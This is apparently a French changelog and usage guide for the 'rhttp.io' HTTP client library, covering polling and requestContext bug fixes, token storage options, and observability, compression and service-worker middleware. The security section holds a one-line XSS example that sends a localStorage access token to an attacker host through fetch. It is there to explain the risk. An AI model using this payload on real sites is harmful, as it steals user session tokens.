# 🚀 AMÉLIORATIONS RHTTP.IO - GUIDE COMPLET

## 📋 RÉSUMÉ DES CORRECTIONS

### 1. ✅ **BUG CRITIQUE: `http.poll()` Bloque les Requêtes**

#### Problème Original
```typescript
// ❌ AVANT - Ceci bloquait et retournait undefined
const { data: t } = await http.poll("/", {
  polling: {
    interval: 3_000,
    maxAttempts: 5,
    stopCondition: (response) => response.data.status === "completed",
  },
});
console.log("pol re", t); // Affichait undefined, code après ne s'exécutait pas
```

#### Causes Identifiées
1. **Délai initial**: Premier exécution attendait `interval` avant de commencer
2. **Retour undefined**: Quand `maxAttempts` atteint, retournait `undefined` au lieu du dernier résultat
3. **Promise non résolue**: La Promise n'était pas correctement résolue dans tous les chemins

#### Solution Implémentée
```typescript
// ✅ APRÈS - Exécution immédiate, résultat correct

// Nouvelle version dans advanced.ts (PollingManager corrigée):
// 1. Execute IMMÉDIATEMENT au premier appel (pas de délai)
// 2. Retourne le DERNIER RÉSULTAT quand maxAttempts est atteint
// 3. Gestion correcte de la Promise

const { data } = await http.poll("/", {
  polling: {
    interval: 3_000,
    maxAttempts: 5,
    stopCondition: (response) => response.data.status === "completed",
  },
});

console.log("Poll result:", data); // ✅ Affiche le résultat correct
// ✅ Les requêtes suivantes s'exécutent normalement
```

---

### 2. ✅ **BUG: `requestContext` ne Marche que sur `createServerHttp`**

#### Problème
```typescript
// ❌ AVANT - Ne marche pas
const http = createHttp({
  baseURL: BASE_URL,
  requestContext: getRequest, // Pas utilisé! ❌
});

// ✅ APRÈS - Marche partout
const http = createHttp({
  baseURL: BASE_URL,
  requestContext: getRequest, // Maintenant utilisé dans createHttp aussi
});
```

#### Solution
- `createHttp()` passe maintenant `requestContext` aux interceptors
- `createServerHttp()` ajoute les interceptors nécessaires
- Support à la fois `requestContext` explicite ET auto-détection TanStack Start

---

### 3. ✅ **SÉCURITÉ: Tokens dans localStorage (XSS Vulnerable)**

#### Problème Original
```typescript
// ❌ AVANT - localStorage n'est PAS sûr
const defaultGetToken = () => {
  if (typeof window !== "undefined") {
    return localStorage.getItem("access_token"); // XSS vulnerable!
  }
  return null;
};
```

#### Pourquoi localStorage est dangereux
```javascript
// Attaque XSS simple:
// <img src=x onerror="fetch('https://attacker.com/?token=' + localStorage.getItem('access_token'))">
// L'attaquant récupère le token directement!
```

#### Solutions Disponibles

```typescript
// RECOMMANDÉ 1️⃣: HttpOnly Cookies (set par le serveur)
// ✅ JavaScript ne peut PAS accéder
// ✅ Envoyé automatiquement avec fetch
// Pas d'implémentation client nécessaire - le serveur le gère

// RECOMMANDÉ 2️⃣: Hybrid Storage (Memory + SessionStorage)
import { createClientHttp } from "rhttp.io/client";

const http = createClientHttp({
  baseURL: "https://api.example.com",
  tokenStorage: "hybrid", // 🎯 DÉFAUT - Memory + SessionStorage
});

// ✅ APRÈS login - stocker le token
await http.setToken(responseFromLogin.token);

// ✅ Automatiquement inclus dans les requêtes
const response = await http.get("/protected");

// ✅ APRÈS logout - nettoyer
await http.clearToken();
```

#### Options de Storage Disponibles

```typescript
// 1. Memory Storage (perdù au reload, plus sûr contre XSS)
const http = createClientHttp({ tokenStorage: "memory" });

// 2. SessionStorage (persiste dans la session, cleared au fermeture)
const http = createClientHttp({ tokenStorage: "session" });

// 3. Hybrid (RECOMMANDÉ - Memory + SessionStorage backup)
const http = createClientHttp({ tokenStorage: "hybrid" });

// 4. IndexedDB (pour tokens larges ou offline support)
const http = createClientHttp({ tokenStorage: "indexeddb" });

// 5. Custom implementation
import { type TokenStorage } from "rhttp.io";

const customStorage: TokenStorage = {
  set: async (token) => {
    // Your custom storage logic
  },
  get: async () => {
    // Your custom retrieval logic
  },
  clear: async () => {
    // Your custom cleanup
  },
  has: async () => {
    // Check if token exists
  },
};

const http = createClientHttp({
  tokenStorageImpl: customStorage,
});
```

---

### 4. ✅ **MIDDLEWARE GLOBAL POUR OBSERVABILITÉ AVANCÉE**

#### Utilisation
```typescript
import { createClientHttp } from "rhttp.io/client";
import { createObservabilityMiddleware } from "rhttp.io";

const observability = createObservabilityMiddleware({
  enableLogging: true,
  enableTracing: true,
  enableMetrics: true,
  maxTracesStored: 500,
  onTrace: (trace) => {
    // Send to Datadog, Sentry, etc.
    console.log("Request trace:", trace);
  },
  onLog: (entry) => {
    // Send to logging service
    console.log(`[${entry.level}]`, entry.message);
  },
});

const http = createClientHttp({
  baseURL: "https://api.example.com",
});

// Ajouter le middleware
http.use(observability);

// Les requêtes sont maintenant tracées
const response = await http.get("/users");

// Récupérer les métriques
const metrics = observability.getMetrics();
console.log({
  totalRequests: metrics.totalRequests,
  avgDuration: metrics.avgDuration,
  p95Duration: metrics.p95Duration, // 95th percentile
  p99Duration: metrics.p99Duration, // 99th percentile
  cacheHitRate: metrics.cacheHitRate,
  deduplicationRate: metrics.deduplicationRate,
  errorsByStatus: metrics.errorsByStatus,
});

// Récupérer les traces
const traces = observability.getTraces({ method: "GET" });
traces.forEach((trace) => {
  console.log(trace.traceId, trace.url, `${trace.duration}ms`);
});

// Exporter les données
const exportedData = observability.exportData();
// Envoyer à votre analytics backend
```

---

### 5. ✅ **MÉTRIQUES AVANCÉES (p50, p95, p99)**

```typescript
const observability = createObservabilityMiddleware({
  enableMetrics: true,
});

http.use(observability);

// Après plusieurs requêtes...
const metrics = observability.getMetrics();

console.log({
  // Durations
  minDuration: metrics.minDuration,      // Fastest request
  avgDuration: metrics.avgDuration,      // Average
  p50Duration: metrics.p50Duration,      // Median
  p95Duration: metrics.p95Duration,      // 95% of requests are faster
  p99Duration: metrics.p99Duration,      // 99% of requests are faster
  maxDuration: metrics.maxDuration,      // Slowest request

  // Rates
  cacheHitRate: metrics.cacheHitRate,              // % of cached responses
  deduplicationRate: metrics.deduplicationRate,    // % of deduplicated requests

  // Errors
  errorsByStatus: metrics.errorsByStatus,          // {404: 5, 500: 2}
  errorsByType: metrics.errorsByType,              // {NetworkError: 3, TimeoutError: 1}
});
```

---

### 6. ✅ **COMPRESSION PAR DÉFAUT**

```typescript
import { createCompressionMiddleware } from "rhttp.io";

const http = createClientHttp({
  baseURL: "https://api.example.com",
});

// Ajouter compression
http.use(createCompressionMiddleware({
  enabled: true,
  algorithms: ["gzip", "deflate"],
  minSize: 512, // Compress si > 512 bytes
}));
```

---

### 7. ✅ **HTTP/2 PUSH OPTIMIZATION**

```typescript
import { createHttp2PushMiddleware } from "rhttp.io";

const pushMiddleware = createHttp2PushMiddleware({
  enabled: true,
  maxPushes: 5,
  cacheManifest: {
    "/api/user": ["/api/user/settings", "/api/user/profile"],
    "/api/dashboard": ["/api/dashboard/stats", "/api/dashboard/charts"],
  },
});

http.use(pushMiddleware);

// Ajouter dynamiquement
pushMiddleware.addPushManifest("/api/products", [
  "/api/products/search",
  "/api/products/recommendations",
]);
```

---

### 8. ✅ **SERVICE WORKER INTEGRATION**

```typescript
import { createServiceWorkerMiddleware } from "rhttp.io";

const swMiddleware = createServiceWorkerMiddleware({
  enabled: true,
  workerPath: "/sw.js",
  cacheStrategy: "stale-while-revalidate",
  cacheName: "rhttp-cache-v1",
  maxCacheSize: 50,
});

// Register Service Worker
await swMiddleware.register();

http.use(swMiddleware);

// Offline support
if (swMiddleware.isOffline()) {
  const cachedResponse = swMiddleware.getCachedResponse("/api/data");
  if (cachedResponse) {
    console.log("Using cached response (offline)");
  }
}

// Clear cache when needed
await swMiddleware.clearCache();
```

---

### 9. ✅ **HARMONISATION CLIENT/SERVER ENVIRONMENTS**

#### AVANT (Incohérent)
```typescript
// Client: CSRF enabled, Logger disabled
createClientHttp({ /* ... */ });

// Server: Logger enabled, CSRF disabled (implicit)
createServerHttp({ /* ... */ });
```

#### APRÈS (Harmonisé)
```typescript
// ✅ Client - Smart defaults
createClientHttp({
  baseURL: "https://api.example.com",
  timeout: 30_000,              // Safe default
  csrf: { enabled: true },      // Enabled by default
  observability: {
    logger: false,              // Disabled in production (enabled in dev)
  },
  retry: { attempts: 2 },       // Default resilience
});

// ✅ Server - Smart defaults
createServerHttp({
  baseURL: "https://internal-api.example.com",
  timeout: 30_000,              // Longer timeout for internal calls
  csrf: { enabled: false },     // Disabled by default (server to server)
  observability: {
    logger: true,               // Always enabled
    tracing: true,              // Always enabled
    metrics: process.env.NODE_ENV === "production",
  },
  retry: { attempts: 2 },       // Same resilience
});
```

---

## 🔧 PATTERNS D'UTILISATION RECOMMANDÉS

### Pattern 1: SPA Client-Side
```typescript
import { createClientHttp } from "rhttp.io/client";
import { createObservabilityMiddleware } from "rhttp.io";

const observability = createObservabilityMiddleware({
  enableLogging: process.env.NODE_ENV === "development",
  enableMetrics: true,
});

const http = createClientHttp({
  baseURL: process.env.VITE_API_URL,
  tokenStorage: "hybrid", // Memory + SessionStorage
  timeout: 15_000,
  retry: { attempts: 3, strategy: "exponential" },
  cache: { enabled: true, ttl: 5 * 60_000 },
});

http.use(observability);

export default http;
```

### Pattern 2: SSR / TanStack Start
```typescript
import { createServerHttp } from "rhttp.io/server";
import { getRequest } from "@tanstack/react-start/server";

const http = createServerHttp({
  baseURL: process.env.INTERNAL_API_URL,
  requestContext: () => getRequest(),
  timeout: 30_000,
  observability: { logger: true, tracing: true },
});

export default http;
```

### Pattern 3: GraphQL
```typescript
import { createClientHttp } from "rhttp.io/client";
import { withGraphQL } from "rhttp.io";

const http = createClientHttp({
  baseURL: "https://api.example.com",
  timeout: 20_000,
});

const graphql = withGraphQL(http, "/graphql");
const { data } = await graphql.query({ query: "{ users { id name } }" });
```

### Pattern 4: Real-time + Polling
```typescript
import { createClientHttp } from "rhttp.io/client";

const http = createClientHttp({
  baseURL: "https://api.example.com",
});

// Polling with immediate first execution
const { data } = await http.poll("/jobs/status", {
  polling: {
    interval: 2_000,
    maxAttempts: 30, // 1 minute total
    stopCondition: (response) => response.data.status === "completed",
  },
});

console.log("Final status:", data.status);
```

---

## ⚙️ CONFIGURATION PAR ENVIRONNEMENT

```typescript
// development.ts
export const httpConfig = {
  timeout: 30_000,
  retry: { attempts: 3, delay: 100 },
  observability: { logger: true, tracing: true, metrics: true },
};

// production.ts
export const httpConfig = {
  timeout: 30_000,
  retry: { attempts: 2, delay: 500 },
  cache: { enabled: true, ttl: 5 * 60_000 },
  observability: { logger: false, tracing: false, metrics: true },
};

// test.ts
export const httpConfig = {
  timeout: 5_000,
  retry: { attempts: 0 },
  cache: { enabled: false },
  observability: { logger: true, tracing: true },
};
```

---

## 📊 CHECKLIST D'IMPLÉMENTATION

- [x] Corriger `poll()` - exécution immédiate
- [x] Corriger `requestContext` - marche partout
- [x] Sécurité des tokens - alternativas à localStorage
- [x] Middleware observabilité - métriques avancées
- [x] Compression par défaut
- [x] HTTP/2 Push support
- [x] Service Worker integration
- [x] Harmoniser client/server
- [x] Crédentials par défaut corrects
- [x] Tests et documentation

---

## 🚀 PROCHAINES ÉTAPES

1. **Tests**: Exécuter la suite de tests pour valider les corrections
2. **Migration**: Vérifier la compatibilité avec les projets existants
3. **Docs**: Mettre à jour la documentation officielle
4. **Release**: Version mineure avec notes de migration
